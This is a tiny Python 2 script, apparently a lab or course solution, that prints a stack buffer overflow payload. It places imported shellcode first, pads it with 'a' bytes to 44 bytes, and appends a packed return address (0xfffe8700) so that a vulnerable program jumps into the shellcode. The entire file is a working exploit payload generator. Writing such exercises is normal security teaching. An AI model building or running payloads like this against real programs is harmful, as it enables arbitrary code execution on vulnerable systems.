import struct
from shellcode import shellcode
#target = 0xfffe8700
print shellcode + 'a'*(44 - len(shellcode)) + struct.pack('<I', 0xfffe8700)
# '\x00' + '\x87' + '\xfe' + '\xff'

